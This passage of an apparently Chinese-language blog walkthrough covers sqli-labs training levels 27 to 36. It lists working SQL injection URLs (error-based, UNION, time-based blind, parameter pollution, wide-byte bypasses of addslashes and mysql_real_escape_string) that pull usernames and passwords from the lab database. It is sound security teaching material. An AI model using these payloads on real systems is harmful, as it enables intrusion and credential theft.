information_schema.schemata  %a0 limit %a0 1,1  ) ),1)  || %a0  ’1’&#x3D;‘1  通过这样查，可以拿到所有的库信息。</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  table_name  %a0 from  %a0   information_schema.tables %a0 where %a0 table_schema &#x3D;  0x7365637572697479 %a0 limit %a0 1,1  ) ),1)  || %a0  ’1‘&#x3D;‘1 通过遍历所有的表的值</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, ( SEleCt %a0  column_name %a0  from %a0  information_schema.columns %a0  where %a0   table_name &#x3D; 0x7573657273  %a0 limit %a0 1,1  ) ),1)  || %a0  ’1‘&#x3D;‘1 通过遍历取出所以都字段</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1&#39;  %a0 ||  updatexml(1, concat(0x7e, (SElect %a0  concat_ws(0x7e,username,password) from  %a0  security.users  %a0 limit %a0 1,1  ) ),1)  || %a0 &#39;1&#39;&#x3D;‘1</span><br><span class="line"> 通过遍历的方法取出里面所有的字段值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-27a-A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-Double-Quotes"><a href="#Less-27a-A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-Double-Quotes" class="headerlink" title="Less-27a: . A GET -Blind Based- All your UNION &amp; SELECT Belong to us - Double Quotes"></a>Less-27a: . A GET -Blind Based- All your UNION &amp; SELECT Belong to us - Double Quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1 有数据</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1’ 此时没有报错，我们将显示sql语句的代码加到代码中。</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“;%00  此时显示正常，但是报错的信息不会显示在代码中。</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2,3     ;%00 得到数据可以回显的位置。</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(schema_name) from    %a0  information_schema.schemata     ;%00 取出了所有的库</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(table_name) from  %a0    information_schema.tables %a0    where  %a0    table_schema &#x3D; 0x7365637572697479     ;%00 取出了所有的表</span><br><span class="line">7. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(column_name) %a0  from %a0 information_schema.columns  %a0 where %a0  table_name &#x3D; 0x7573657273    ;%00 取出了所有的字段名</span><br><span class="line">8. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(concat_ws(0x7e,username,password))  %a0  from  %a0  security.users  ;%00 取出所有的字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法二：使用基于时间的盲注  其中%26%26 代表 &amp;&amp;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“ %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26 %0a  ”1“&#x3D;”1 </span><br><span class="line">注意：在句子后面不能使用or，因为使用or的情况下，无论如何情况返回都会是真。</span><br><span class="line">http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“ %26%26 if( length(database())&gt;1, 1, sleep(5)    )  || %0a  ”1“&#x3D;”1  这种写法是错误的</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ || if( length(database())&#x3D;1, 1, sleep(5)    )  %26%26  %0a  ”1“&#x3D;”1 这样写也是可以的</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-28：GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-with-parenthesis"><a href="#Less-28：GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-with-parenthesis" class="headerlink" title="Less-28：GET -Error Based- All your UNION &amp; SELECT Belong to us - String -Single quote with parenthesis"></a>Less-28：GET -Error Based- All your UNION &amp; SELECT Belong to us - String -Single quote with parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1 显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1’ 此时显示不正常，说明可能存在注入漏洞</span><br><span class="line">接下来就是坑来了：</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘ || ’1‘&#x3D;‘1  这个时候数据回显正常</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘  %a0   union %a0   select %a0  1,2,3      || ’1‘&#x3D;‘1  这个正常的操作但是显示确实错误的？  我们将   ||进行替换一下</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘  %a0   union %a0   select %a0  1,2,3     ;%00  还是显示错误的</span><br><span class="line"></span><br><span class="line">问题在哪？</span><br><span class="line">通过查看源代码可知：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-28&#x2F;?id&#x3D;1‘   || ’1‘&#x3D;‘2 查询的sql语句：SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;||&#39;1&#39;&#x3D;&#39;2&#39;) LIMIT 0,1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mysql命令行执行下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我们在mysql命令行中执行以下命令：</span><br><span class="line"> 1. select * from users ;  显示所有的数据</span><br><span class="line">2. select true ;   返回结果是1，也就是代表正确</span><br><span class="line">3. select false;  返回结果是0，代表着错误</span><br><span class="line">4. select (2  and 1&#x3D;2); 返回结果是 0</span><br><span class="line">5. select (2  or 1&#x3D;2);  返回结果是 1</span><br><span class="line">6. select * from users where id&#x3D;(1); 此时返回第一列数据</span><br><span class="line">7. select * from users where id&#x3D;(true); 此时返回也是第一列</span><br><span class="line">以上问题说明，我们的id值处理有问题，正确的语句应该是：</span><br><span class="line"> SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;||&#39;1&#39;&#x3D;&#39;2&#39;) LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>基于时间的盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于时间的盲注</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    ) ;%00 </span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26  (&#39;1&#39;)&#x3D;(‘1</span><br><span class="line">这两种都是可以的</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-28a：-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-single-quote-parenthesis"><a href="#Less-28a：-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-single-quote-parenthesis" class="headerlink" title="Less-28a： GET - Blind Based- All your UNION &amp; SELECT Belong to us-single quote-parenthesis"></a>Less-28a： GET - Blind Based- All your UNION &amp; SELECT Belong to us-single quote-parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1 此时显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1’ 有报错，可能存在注入</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1‘)  %a0 order  %a0  by %a0  3 ;%00  利用order by语句得到一共有3列。</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1111‘) %a0 union   %a0  select  %a0  1,2,3 ;%00  此时得到数据可以显示的位置。</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1111‘) %a0 union   %a0  select  %a0  1,2,group_concat(schema_name) %a0  from  %a0   information_schema.schemata ;%00  得到所有的库</span><br><span class="line">6. 其余的操作和less-27基本无异。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于时间的盲注</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) %a0  or  %a0   if( length(database())&#x3D;8, 1, sleep(5)    ) --+</span><br><span class="line">或者是</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1‘) %a0  and  %a0   if( length(database())&#x3D;8, 1, sleep(5)    ) --+  此时要确保前面的id值是可以查到的，不能使用一个不存在的id值。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-29: GET-Error based-IMPIDENCE MISMATCH- Having a WAF in front of web application."></a>Less-29: GET-Error based-IMPIDENCE MISMATCH- Having a WAF in front of web application.</h2><p><strong>环境搭配</strong></p><p>•1. 在docker中是无法正常使用第29关的，因为需要搭建jsp服务</p><p>•2.我们可以使用jspstudy在本地搭建，端口设置为8080</p><p>•3. phpstudy端口设置为80</p><p>•4.修改jsp中的文件index.jsp文件的url指向位置到你安装sqli-labs中的less29下</p><p><img src="/2020/07/13/sqlo-labs/image-20200524113033880.png" alt="image-20200524113033880"></p><p><strong>•http参数污染：</strong>jsp/tomcat使用getgetParameter(“id”)获取到的是第一个值，php/apache使用$_GET[“id”]获取的是第二个值，那么第一个id纯数字，第二个id的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;3‘  order by 3--+ 说明数据有3列，而且第一个id值无法注入</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;113‘  union select 1,2, 3  --+ 已经知道数据回显的位置</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;113‘  union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  此时我们已经取出数据库的名字。</span><br><span class="line">4. 接下来就是常规的操作，和less1基本一致</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-30: GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application."></a>Less-30: GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;1“ order by 3--+  这里显示是正常的，4的时候是不正常的，但是显示异常并没有显示报错的信息。说明无法使用报错注入。</span><br><span class="line">2. 接下里和less29相同</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;11111&quot; union select 1,2, 3--+</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;11111“ union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  接下来就是常规操作了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-31-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-31-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-31: GET-BLIND -IMPIDENCE MISMATCH- Having a WAF in front of web application"></a>Less-31: GET-BLIND -IMPIDENCE MISMATCH- Having a WAF in front of web application</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-1 &quot;) union select 1,2,3 --+ </span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-1 &quot;) union select 1,2,group_concat(schema_name) from    information_schema.schemata --+   </span><br><span class="line">操作和前面的基本相同</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32:GET - Bypass custom filter adding slashes to dangerous chars."></a>Less-32:GET - Bypass custom filter adding slashes to dangerous chars.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">法一：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;1 这个时候返回的是正常数据</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;1’ 此时返回的是经过转义之后的数据，我们通过返回的数据可以看到，单引号已经被转义了 </span><br><span class="line">3. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df‘ 或者http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df%27此时发现出现了注入点，这个时候我们继续</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df’ --+ 这个时候返回正常</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df‘ order by 4 --+ 此时返回与以前的关卡中同样的错误，接下来就是正常的注入操作了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200524124956905.png" alt="image-20200524124956905"></p><p><strong>法二：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">法二：</span><br><span class="line">%5c代表的是 \ </span><br><span class="line">此时构造： %5c %5c %5c %5c’</span><br><span class="line">只要是我们能将返回的结果中对于单引号没有转义字符进行处理即可。</span><br><span class="line">示例方法： http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;-1%aa%5c&#39; union select 1,2,3 --+</span><br><span class="line">其余操作基本相似。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">每一步的转换</span><br><span class="line">%aa%5c&#39;       %5c是：\即反斜杠  %27是：&#39; 单引号</span><br><span class="line">%aa%5c%27</span><br><span class="line">%aa%5c%5c%5c%27</span><br><span class="line">%aa%5c %5c%5c%27</span><br><span class="line">猏 \\ &#39;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200524130042085.png" alt="image-20200524130042085"></p><h2 id="Less-33-GET-Bypass-Addslashes"><a href="#Less-33-GET-Bypass-Addslashes" class="headerlink" title="Less-33: GET - Bypass Addslashes()"></a>Less-33: GET - Bypass Addslashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">通过源码可得知： 在32关中使用的是自定义的过滤，本关中使用的是php中的 addslashes()函数</span><br><span class="line">其作用:addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。(参考链接：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;func_string_addslashes.asp)</span><br><span class="line">法1： 直接使用宽字节的方法</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-33&#x2F;?id&#x3D;1%df’--+</span><br></pre></td></tr></table></figure><p><strong>法二：自定义闭合</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">法二：自定义闭合</span><br><span class="line">http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-33&#x2F;?id&#x3D;-1%aa%5c%27 union select 1,2,3--+</span><br><span class="line">其实和less32关基本相同。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200526105037591.png" alt="image-20200526105037591"></p><h2 id="Less-34-POST-Bypass-AddSlashes"><a href="#Less-34-POST-Bypass-AddSlashes" class="headerlink" title="Less-34: POST - Bypass AddSlashes()"></a>Less-34: POST - Bypass AddSlashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.   admin:admin 正确的密码和账号  --&gt;   返回姓名等常规信息</span><br><span class="line">2.   ad:ad   错误的密码和账号返回的是登录失败</span><br><span class="line">3.   同样通过代码可知，本关也使用了addslashes()函数，理论上我们可以使用前几关中的宽字节注入的方法进行测试，但是测试的时候发现，方法并不奏效。（主要原因是因为我们不能够直接在POST中传入数据，因为会被再次编码）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分析：</strong>在<code>get</code>型传参的时候使用<code>URLencode</code>，所以我们可以使用以下两种方法：<br><strong>法一：</strong>我们借鉴了将单引号的<code>UTF-8</code>转换为<code>UTF-16</code>的单引号模式 <code>‘ -&gt; �&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">借鉴了将单引号的UTF-8转换为UTF-16的单引号模式 ‘ -&gt;  �’(注意，在复制的时候要将单引号重新打出来，因为在ppt中总会因为奇怪的格式出现错误)</span><br><span class="line">在POST中传入的数据： �\‘ union select 1,2# （注意：在这里不能够再使用--+ --空格等这样的注释符，我们推荐使用#）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>法二：</strong>我们使用burpsuite进行抓包之后对数据进行宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们首先在使用bp进行抓包之后，在bp中修改信息得到返回信息即可！</span><br><span class="line">1. 我们本来传入的数据： a%df’</span><br><span class="line">2. 但是我们抓包之后的数据： uname&#x3D;a%25df%2527&amp;passwd&#x3D;a%25df%2527&amp;submit&#x3D;Submit</span><br><span class="line">我们可以发现%经过url转换之后为%25</span><br><span class="line">所以我们需要在拦截数据包之后将数据进行修改： uname&#x3D;a%df%27&amp;passwd&#x3D;a%df%27&amp;submit&#x3D;Submit</span><br><span class="line">接下来就是正常的注入流程。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Integer-based"><a href="#Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Integer-based" class="headerlink" title="Less-35:GET - Bypass Add Slashes (we dont need them) Integer based"></a>Less-35:GET - Bypass Add Slashes (we dont need them) Integer based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">其实本关和34基本相同，我们首先分析一下代码：</span><br><span class="line">$id&#x3D;check_addslashes($_GET[‘id’]);  首先还是对id的值进行过滤处理</span><br><span class="line">$sql&#x3D;“SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”; 在这个位置中，id值没有经过单引号的包裹，所以我们只要在注入的时候防止我们构造的sql注入句子中避免单引号等即可！</span><br></pre></td></tr></table></figure><p><strong>法一：</strong> 联合查询注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from    information_schema.schemata#</span><br></pre></td></tr></table></figure><p><strong>法二：</strong>延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-35&#x2F;?id&#x3D;1 and  if( length(database())&#x3D;1, 1, sleep(5)    )#通过这样的方式进行判断。</span><br></pre></td></tr></table></figure><h2 id="Less-36-：-GET-Bypass-MysQL-real-escape-string"><a href="#Less-36-：-GET-Bypass-MysQL-real-escape-string" class="headerlink" title="Less-36 ：  GET -Bypass MysQL real escape string"></a>Less-36 ：  GET -Bypass MysQL real escape string</h2><p><code>mysql_real_escape_string() </code>函数转义 SQL 语句中使用的字符串中的特殊字符。  </p><p>下列字符受影响：  </p><ul><li><code>\x00</code></li><li><code>\n</code></li><li><code>\n</code></li><li><code>\</code></li><li><code>&#39;</code></li><li><code>&quot;</code></li><li><code>\x1a</code></li></ul><p>如果成功， 则该函数返回被转义的字符串。 如果失败， 则返回 false  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">我们首先进行源代码审计，发现代码中使用了mysql_real_escape_string函数（参考：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;func_mysql_real_escape_string.asp）</span><br><span class="line"></span><br><span class="line">我们此处尝试直接使用原来的宽字节注入：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1%df’ # 发现有作用，可以进行注入</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,3 --+ 接下来就是正常的注入流程了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>完整演示</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ 1取出所有的库</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema &#x3D; 0x7365637572697479  --+ 取出所有的表</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273  --+ 取出所有的字段</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users  --+ 取出所有的字段的值</span><br><span 